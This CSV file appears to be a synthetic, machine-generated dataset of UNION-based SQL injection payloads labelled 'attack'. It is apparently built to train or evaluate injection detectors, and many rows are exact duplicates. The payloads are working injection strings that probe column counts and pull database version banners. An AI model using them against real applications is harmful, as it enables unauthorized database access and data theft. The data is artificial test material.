id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000176,attack,union,"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",nearest_attack_euclidean,R000052,4.5910115238529166
CTGAN_000177,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000131,7.369014067498393
CTGAN_000178,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000103,5.983801876201739
CTGAN_000179,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,6.533022282071583
CTGAN_000180,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,4.527085020960762
CTGAN_000181,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000152,4.639038463372749
CTGAN_000182,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,5.341383618529012
CTGAN_000183,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,6.316840343181093
CTGAN_000184,attack,union,"-6389"" union all select 2355,2355,2355,2355,2355--",nearest_attack_euclidean,R000056,5.091215949794991
CTGAN_000185,attack,union,"-9577'||  (  select 'vloa' from dual where 7184  =  7184 union all select 7184,7184#",nearest_attack_euclidean,R000118,7.894964354688392
CTGAN_000186,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000121,6.526445734629004
CTGAN_000187,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,5.80755958236054
CTGAN_000188,attack,union,"-9734'   )    )    as izbx where 6273  =  6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",nearest_attack_euclidean,R000068,6.660020071012205
CTGAN_000189,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,4.625929959676215
CTGAN_000190,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000057,7.662892258605471
CTGAN_000191,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000096,6.426195463246538
CTGAN_000192,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000125,6.634591828909737
CTGAN_000193,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000044,10.892552226911473
CTGAN_000194,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000044,8.189825066897109
CTGAN_000195,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,5.3816247027388595
CTGAN_000196,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,6.183673374591149
CTGAN_000197,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000044,7.591292741401217
CTGAN_000198,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,5.7231073240212815
CTGAN_000199,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000067,7.59554949445771
CTGAN_000200,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,5.9291472713818285
CTGAN_000201,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000099,4.827728828259892
CTGAN_000202,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000095,5.52197951142003
CTGAN_000203,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.2026307451110965
CTGAN_000204,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000116,5.360983996920721
CTGAN_000205,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,5.388667376423062
CTGAN_000206,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,6.854249172904414
CTGAN_000207,attack,union,"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",nearest_attack_euclidean,R000052,6.454481237597844
CTGAN_000208,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000044,7.087637945931976
CTGAN_000209,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,6.7809291994768435
CTGAN_000210,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,5.892687645170874
CTGAN_000211,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000039,8.812482100597833
CTGAN_000212,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000106,7.292526950777627
CTGAN_000213,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,6.5825100950951345
CTGAN_000214,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,5.259679062937137
CTGAN_000215,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000084,5.963940666370631
CTGAN_000216,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,7.026121914135478
CTGAN_000217,attack,union,"-9577'||  (  select 'vloa' from dual where 7184  =  7184 union all select 7184,7184#",nearest_attack_euclidean,R000118,6.909046305097844
CTGAN_000218,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000021,9.116185790778166
CTGAN_000219,attack,union,"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",nearest_attack_euclidean,R000156,6.343026684822122
CTGAN_000220,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000011,8.773669902113967
CTGAN_000221,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000152,6.095204303795454
CTGAN_000222,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000131,6.467590036011408
CTGAN_000223,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,7.768535235194666
CTGAN_000224,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R000149,6.634301529040723
CTGAN_000225,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000108,7.0714090801173075
CTGAN_000226,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,6.793162287690189
CTGAN_000227,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000039,5.735913762562663
CTGAN_000228,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,5.788199597368253
CTGAN_000229,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,3.745625472634709
CTGAN_000230,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000116,7.461101400005386
CTGAN_000231,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000043,9.32660223468874
CTGAN_000232,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,6.578070500652339
CTGAN_000233,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,6.9051618638703385
CTGAN_000234,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000040,6.03764675291037
CTGAN_000235,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000057,5.873545179848676
CTGAN_000236,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000043,6.1578146231373685
CTGAN_000237,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R000149,6.3048741241114294
CTGAN_000238,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000084,8.986999374701425
CTGAN_000239,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000050,6.523310224828147
CTGAN_000240,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000131,6.424471854839735
CTGAN_000241,attack,union,"1' in boolean mode  )   union all select null,null--",nearest_attack_euclidean,R000049,4.947765499930719
CTGAN_000242,attack,union,"-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#",nearest_attack_euclidean,R000081,7.703730712812724
CTGAN_000243,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000103,5.438721758097223
CTGAN_000244,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,7.593864292927759
CTGAN_000245,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000147,9.321492164838997
CTGAN_000246,attack,union,"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",nearest_attack_euclidean,R000098,9.032869728997762
CTGAN_000247,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000095,5.990893463973896
CTGAN_000248,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000096,6.138467275313784
CTGAN_000249,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,5.67098382745085
CTGAN_000250,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000121,3.9224816316291164
CTGAN_000251,attack,union,"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",nearest_attack_euclidean,R000052,6.698576056905624
CTGAN_000252,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000131,5.712447324979481
CTGAN_000253,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,8.48839405236625
CTGAN_000254,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,6.959491136290764
CTGAN_000255,attack,union,"-9734'   )    )    as izbx where 6273  =  6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",nearest_attack_euclidean,R000068,6.730221392178421
CTGAN_000256,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000082,6.678897651075361
CTGAN_000257,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000022,6.659014285183127
CTGAN_000258,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,6.062455623030631
CTGAN_000259,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000069,7.170287828820294
CTGAN_000260,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000012,9.435764788129969
CTGAN_000261,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,7.0294067012225465
CTGAN_000262,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000095,6.756846754818041
CTGAN_000263,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000016,10.96804358650611
CTGAN_000264,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,6.171080771351482
CTGAN_000265,attack,union," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000020,8.690968599219197
CTGAN_000266,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000022,7.146755313670652
CTGAN_000267,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000084,4.9405381069604175
CTGAN_000268,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000117,6.353021100052881
CTGAN_000269,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000117,7.220779950008958
CTGAN_000270,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000045,6.020331289430537
CTGAN_000271,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000106,5.626311343461648
CTGAN_000272,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,5.205862902232173
CTGAN_000273,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000043,5.96934777952981
CTGAN_000274,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000099,7.18835661702618
CTGAN_000275,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000048,5.550108973613613
CTGAN_000276,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000050,5.402341239065849
CTGAN_000277,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,5.635611790356696
